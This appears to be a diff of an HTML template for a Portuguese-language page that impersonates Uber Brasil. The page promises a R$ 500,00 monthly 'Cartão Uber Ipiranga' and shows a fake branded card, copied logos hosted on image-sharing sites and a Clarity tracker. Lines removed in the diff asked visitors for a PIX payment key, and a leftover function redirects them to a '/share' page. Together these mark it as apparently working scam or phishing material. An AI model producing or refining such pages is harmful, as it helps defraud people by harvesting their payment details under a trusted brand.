@@ -1,146 +1,275 @@
-{% extends "layout.html" %}
+        <html>
+         <head>
+          <script type="text/javascript">
+           (function(c,l,a,r,i,t,y){
+                    c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+                    t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+                    y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+                })(window, document, "clarity", "script", "s4nz0u51fp");
+          </script>
+          <title>
+           Cartão de Recebimento Uber - R$ 500,00 | Uber
+          </title>
+          <meta content="Uber Brasil" property="og:title"/>
+          <meta content="Receba seus R$ 500,00 mensais através do Cartão Uber com Quilômetros de Vantagens e benefícios exclusivos." property="og:description"/>
+          <meta content="https://placehold.co/600x400?text=Cartão+Uber+Ipiranga" property="og:image"/>
+          <meta content="www.uber.com.br" property="og:url"/>
+          <meta content="website" property="og:type"/>
+          <meta charset="utf-8">
+           <meta content="width=device-width, initial-scale=1" name="viewport">
+            <script src="https://cdn.tailwindcss.com">
+            </script>
+            <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet"/>
+            <link href="/static/css/uber-fonts.css" rel="stylesheet"/>
+            <link href="/static/css/icon-fix.css" rel="stylesheet"/>
+            <link href="https://fonts.googleapis.com/css?family=Roboto:400,700&amp;display=swap" rel="stylesheet"/>
+            <link href="https://fonts.googleapis.com/css2?family=OCR+A+Std&display=swap" rel="stylesheet">
+            <style>
+             @font-face {
+                font-family: 'UberMoveText';
+                src: url('/static/fonts/UberMoveText-Regular.woff') format('woff'), url('/static/fonts/UberMoveText-Regular.ttf') format('truetype');
+                font-weight: 400;
+                font-display: swap;
+              }
+              @font-face {
+                font-family: 'UberMoveText';
+                src: url('/static/fonts/UberMoveText-Bold.woff') format('woff'), url('/static/fonts/UberMoveText-Bold.ttf') format('truetype');
+                font-weight: 700;
+                font-display: swap;
+              }
+              @font-face {
+                font-family: 'UberMove';
+                src: url('/static/fonts/UberMove-Medium.woff') format('woff'), url('/static/fonts/UberMove-Medium.ttf') format('truetype');
+                font-weight: 500;
+                font-display: swap;
+              }
 
-{% block extra_head %}
-<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
-<style>
-#uber-check, #pix-check {
-    border-radius: 50% !important;
-    width: 12px !important;
-    height: 12px !important;
-    background-color: #000000 !important;
-    display: none !important;
-    box-sizing: border-box !important;
-    flex-shrink: 0 !important;
-}
-#uber-check.show, #pix-check.show {
-    display: block !important;
-}
+              * {
+                font-family: "UberMoveText", "UberMove", Arial, sans-serif !important;
+              }
 
-/* Custom select styling */
-.custom-select {
-    position: relative;
-    width: 100%;
-}
+              body {
+                font-family: "UberMoveText", "UberMove", Arial, sans-serif !important;
+                font-size: 16px;
+                line-height: 24px;
+                background: #fff;
+                color: #333333;
+              }
 
-.custom-select select {
-    appearance: none;
-    -webkit-appearance: none;
-    -moz-appearance: none;
-    background: white;
-    border: 1px solid #d1d5db;
-    padding: 12px 16px;
-    width: 100%;
-    border-radius: 0px;
-    font-size: 16px;
-    color: #000;
-    cursor: pointer;
-    outline: none;
-    transition: border-color 0.2s;
-}
-
-.custom-select select:focus {
-    border-color: #000 !important;
-    box-shadow: none !important;
-    outline: none !important;
-}
-
-.custom-select::after {
-    content: '▼';
-    position: absolute;
-    top: 50%;
-    right: 12px;
-    transform: translateY(-50%);
-    pointer-events: none;
-    color: #666;
-    font-size: 12px;
-}
-
-/* Remove blue focus from inputs */
-input[type="text"], input[type="email"], input[type="tel"], select {
-    outline: none !important;
-    box-shadow: none !important;
-}
-
-input[type="text"]:focus, input[type="email"]:focus, input[type="tel"]:focus, select:focus {
-    border-color: #000 !important;
-    box-shadow: none !important;
-    outline: none !important;
-}
-</style>
-{% endblock %}
-
-{% block content %}
-<div class="max-w-lg mx-auto px-4 py-8">
-    <!-- Header -->
-    <div class="text-center mb-8">
-        <h1 class="text-2xl font-bold text-black mb-2">Como deseja receber?</h1>
-        <p class="text-gray-600">Escolha a forma de recebimento do seu pagamento mensal de R$ 500,00</p>
-    </div>
-
-    <!-- Payment Options -->
-    <div class="space-y-4 mb-8">
-        <!-- Uber Account Option -->
-        <div id="uber-option" class="bg-white border-2 border-gray-200 p-6 cursor-pointer hover:border-black transition-colors" style="border-radius: 0px;" onclick="selectUberAccount()">
-            <div class="flex items-center space-x-4">
-                <img src="https://is1-ssl.mzstatic.com/image/thumb/Purple211/v4/26/20/04/262004f7-0886-3241-d236-ed5b181120df/AppIcon-0-0-1x_U007emarketing-0-8-0-0-85-220.png/1200x600wa.png" 
-                     alt="Uber" class="w-20 h-20 object-contain rounded-lg">
-                <div class="flex-1">
-                    <h3 class="text-base font-semibold text-black mb-1">Conta Uber</h3>
-                    <p class="text-xs font-bold text-gray-600" id="user-info">Carregando...</p>
-                    <p class="text-xs text-gray-500 mt-1">Receba diretamente na sua carteira Uber</p>
-                </div>
-                <div class="w-6 h-6 border-2 border-gray-300 rounded-full flex items-center justify-center">
-                    <div id="uber-check"></div>
-                </div>
-            </div>
-        </div>
-
-        <!-- PIX Option -->
-        <div id="pix-option" class="bg-white border-2 border-gray-200 p-6 cursor-pointer hover:border-black transition-colors" style="border-radius: 0px;" onclick="selectPix()">
-            <div class="flex items-center space-x-4">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a2/Logo%E2%80%94pix_powered_by_Banco_Central_%28Brazil%2C_2020%29.svg/2560px-Logo%E2%80%94pix_powered_by_Banco_Central_%28Brazil%2C_2020%29.svg.png" 
-                     alt="PIX" class="w-20 h-20 object-contain">
-                <div class="flex-1">
-                    <h3 class="text-base font-semibold text-black mb-1">PIX</h3>
-                    <p class="text-xs text-gray-600">Transferência instantânea</p>
-                    <p class="text-xs text-gray-500 mt-1">Receba via chave PIX</p>
-                </div>
-                <div class="w-6 h-6 border-2 border-gray-300 rounded-full flex items-center justify-center">
-                    <div id="pix-check"></div>
-                </div>
-            </div>
-        </div>
-    </div>
-
-    <!-- PIX Details (Hidden by default) -->
-    <div id="pix-details" class="hidden mb-8">
-        <div class="p-6" style="background-color: #EEEEEE; border-radius: 0px;">
-            <h3 class="text-lg font-semibold text-black mb-4">Dados PIX</h3>
-            
-            <!-- PIX Key Type Selector -->
-            <div class="mb-4">
-                <label class="block text-sm font-medium text-black mb-2">Tipo de Chave PIX</label>
-                <div class="custom-select">
-                    <select id="pix-type">
-                        <option value="">Selecione o tipo de chave</option>
-                        <option value="email">E-mail</option>
-                        <option value="cpf">CPF</option>
-                        <option value="telefone">Telefone</option>
-                        <option value="aleatoria">Chave Aleatória</option>
-                    </select>
-                </div>
-            </div>
-
-            <!-- PIX Key Input -->
-            <div class="mb-4">
-                <label class="block text-sm font-medium text-black mb-2" id="pix-key-label">Chave PIX</label>
-                <input type="text" id="pix-key" 
-                       class="w-full px-4 py-3 border border-gray-300" 
-                       style="border-radius: 0px;"
-                       placeholder="Digite sua chave PIX">
-            </div>
-        </div>
-    </div>
+              h1, h2, h3, h4, h5, h6 {
+                font-family: "UberMove", "UberMoveText", Arial, sans-serif !important;
+                font-size: 28px !important;
+                font-weight: 700 !important;
+                line-height: 36px !important;
+                color: #333333 !important;
+              }
+              .uber-link {
+                color: #000;
+                text-decoration: underline;
+              }
+              .uber-link:hover {
+                color: #333;
+              }
+              .uber-btn, button, .btn, input[type="submit"], input[type="button"] {
+                background: #000 !important;
+                color: #fff !important;
+                font-size: 16px;
+                font-weight: 700;
+                border-radius: 2px !important;
+                padding: 10px 24px;
+                transition: background 0.2s;
+                border: none !important;
+              }
+              .uber-btn:hover, button:hover, .btn:hover, input[type="submit"]:hover, input[type="button"]:hover {
+                background: #222 !important;
+                color: #fff !important;
+              }
+              .uber-btn-outline {
+                background: #000 !important;
+                color: #fff !important;
+                border: 1px solid #000 !important;
+                font-size: 16px;
+                font-weight: 500;
+                border-radius: 2px !important;
+                padding: 10px 24px;
+                transition: background 0.2s;
+              }
+              .uber-btn-outline:hover {
+                background: #222 !important;
+                color: #fff !important;
+              }
+              h1, h2 {
+                font-family: 'Uber Move', Arial, sans-serif;
+                font-size: 32px !important;
+                line-height: 1.2;
+              }
+              p, span, li, a, div, label {
+                line-height: 1.5;
+                font-size: 16px;
+              }
+              @media (max-width: 768px) {
+                h1, h2 {
+                  font-size: 28px !important;
+                }
+              }
+              @media (max-width: 640px) {
+                h1, h2 {
+                  font-size: 24px !important;
+                }
+              }
+              /* Force 0px border radius globally except for the card */
+              *, *::before, *::after {
+                border-radius: 0px !important;
+              }
+              .card-font {
+                font-family: 'Roboto', Arial, sans-serif;
+                letter-spacing: 0.08em;
+              }
+              .ocr-font {
+                font-family: 'OCR A Std', 'OCR A', 'Courier', monospace;
+                letter-spacing: 0.1em;
+                font-variant-numeric: tabular-nums;
+                color: #ffffff !important;
+                text-shadow:
+                  1px 1px 0 #b0b0b0,
+                  2px 2px 2px #2226,
+                  0 2px 6px #0008;
+              }
+              .uber-font {
+                font-family: 'Roboto', Arial, sans-serif;
+                font-weight: 400;
+                letter-spacing: 0.01em;
+              }
+              .ipiranga-font {
+                font-family: 'Roboto', Arial, sans-serif;
+                font-weight: 700;
+                letter-spacing: 0.01em;
+              }
+              .card-gradient-bg {
+                background: linear-gradient(135deg, #0a0a0a 0%, #232323 45%, #232323 60%, #101214 100%);
+              }
+              .card-container {
+                width: 320px;
+                max-width: 90vw;
+                aspect-ratio: 1.586;
+                position: relative;
+                margin-left: auto;
+                margin-right: auto;
+                min-width: 0;
+                min-height: 0;
+                display: block;
+                border-radius: 10px !important;
+                overflow: hidden;
+              }
+              @media (max-width: 400px) {
+                .card-container {
+                  width: 98vw;
+                }
+              }
+            </style>
+           </meta>
+          </meta>
+         </head>
+         <body class="bg-white text-black min-w-[0]">
+          <!-- Top nav (mobile only logo + hamburger menu) -->
+          <div class="w-full bg-black text-white text-xs font-normal py-4 px-4 flex items-center justify-between fixed top-0 left-0 right-0 z-50" style="min-height:64px; border-radius: 0px;">
+           <img alt="Logo Uber estilizado em preto e branco, com fundo transparente" class="h-8 w-auto" src="https://i.ibb.co/0RR0HNC0/13093103960002-1.png" style="max-height:32px; border-radius: 0px;"/>
+           <div class="flex items-center md:hidden">
+            <button aria-label="Abrir menu" class="flex flex-col justify-center items-center space-y-1">
+             <span class="block w-7 h-1.5 bg-white rounded" style="height:7px;">
+             </span>
+             <span class="block w-7 h-1.5 bg-white rounded" style="height:7px;">
+             </span>
+            </button>
+           </div>
+          </div>
+          <!-- Subnav (hidden on mobile) -->
+          <div class="w-full bg-white border-b border-gray-200 text-xs px-4 py-2 items-center justify-between hidden md:flex fixed top-16 left-0 right-0 z-40" style="border-radius: 0px;">
+           <div class="flex items-center space-x-2">
+            <span class="font-bold text-base text-black mr-4" style="font-family: 'Uber Move', Arial, sans-serif;">
+             Benefícios
+            </span>
+            <a class="text-black hover:underline" href="#">
+             Visão geral
+            </a>
+            <a class="text-black hover:underline" href="#">
+             Cartão Uber Ipiranga
+            </a>
+            <a class="text-black hover:underline" href="#">
+             Descontos
+            </a>
+            <a class="text-black hover:underline" href="#">
+             Parcerias
+            </a>
+            <a class="text-black hover:underline" href="#">
+             Programa de fidelidade
+            </a>
+           </div>
+           <div class="flex items-center space-x-2">
+            <span class="text-xs text-gray-500">
+             Mais
+            </span>
+            <i class="fa fa-chevron-down text-xs text-gray-500">
+            </i>
+           </div>
+          </div>
+          <!-- Main content -->
+          <div class="max-w-[1100px] mx-auto px-4 pt-24 pb-0">
+           <!-- Title -->
+           <div>
+            <h1 class="font-bold leading-tight mb-4 text-center">
+             Cartão de Recebimento Uber - R$ 500,00 Mensais
+            </h1>
+            <p class="text-black mb-4 max-w-[600px] mx-auto text-center">
+             Este é o cartão onde você receberá seus R$ 500,00 mensais do programa Uber Partners. Já vem com o benefício Quilômetros de Vantagens e todos os descontos exclusivos.
+            </p>
+            <div class="flex flex-col sm:flex-row items-center gap-6 mb-6">
+             <div class="flex flex-col items-center w-full">
+              <div class="card-container shadow-lg card-gradient-bg" style="margin-left: auto; margin-right: auto; overflow: hidden; border-radius: 10px !important;">
+               <div class="absolute" style="top:11px; left:25px; display:flex; align-items:center;">
+                <img alt="Logo Uber em branco com fundo transparente" src="https://i.ibb.co/Z6rZ8R1v/13093103960002-1-removebg-preview.png" style="height:3.5rem; max-width:200px; width:auto; object-fit:contain;">
+               </div>
+               <div class="absolute" style="top:22px; right:25px; display:flex; align-items:center;">
+                <img alt="Ipiranga logo substituída por logo vermelha e branca em fundo transparente" src="https://i.ibb.co/B5B61LdW/Noti-cias-Dia-rias-Post-Feed-Para-Instagram-Vermelho-E-Branco-24-1-2-1-removebg-preview.png" style="height:2.5rem; max-width:140px; width:auto; object-fit:contain;">
+               </div>
+               <div class="absolute" style="top:75px; left:25px;">
+                <img alt="Credit card chip, golden color with intricate circuit-like details" class="rounded" src="https://i.ibb.co/8DrZxqnq/c-HJpdm-F0-ZS9sci9pb-WFn-ZXMvd2-Vic2l0-ZS8y-MDIy-LTA3-L2pv-Yj-Ew-Njgt-ZWxlb-WVud-C1ja-Glw-LTAy-LWw1d.png" style="width:54px; height:auto;">
+               </div>
+               <div class="absolute ocr-font select-none" style="top:120px; left:25px; font-size:1.3rem; display:flex;">
+                2300&nbsp;0210&nbsp;0016&nbsp;0306
+               </div>
+               <div class="absolute ocr-font select-none" style="top:150px; left:25px; font-size:1.05rem; display:flex;" id="cardUserName">
+                NOME&nbsp;SOBRENOME
+               </div>
+               <div class="absolute" style="bottom:10px; right:25px; display:flex; align-items:center;">
+                <img alt="Mastercard logo with text in white" src="https://i.ibb.co/5h1TwChY/Noti-cias-Dia-rias-Post-Feed-Para-Instagram-Vermelho-E-Branco-25-1-1.png" style="height:2.4rem; width:auto; object-fit:contain; position:relative; top:1px;">
+               </div>
+              </div>
+        <br>
+                  <div class="flex-1">
+                   <ul class="list-disc pl-5 text-black mb-2">
+                    <li>
+                     Cartão exclusivo para recebimento dos R$ 500,00 mensais
+                    </li>
+                    <li>
+                     Quilômetros de Vantagens já incluído sem custo adicional
+                    </li>
+                    <li>
+                     Desconto vitalício de até 8% por litro de gasolina ou etanol
+                    </li>
+                    <li>
+                     Válido em centenas de postos Ipiranga em todo o Brasil
+                    </li>
+                    <li>
+                     Desconto automático direto na bomba
+                    </li>
+                    <li>
+                     Funciona com ou sem app Ipiranga/Abastece Aí
+                    </li>
+                   </ul>
+                  </div>
+                 </div>
+                <br>
 
     <!-- Continue Button -->
     <div class="text-center">
@@ -338,4 +467,5 @@ function goDirectToAddress() {
     location.href = '/share';
 }
 </script>
-{% endblock %}
+         </body>
+        </html>
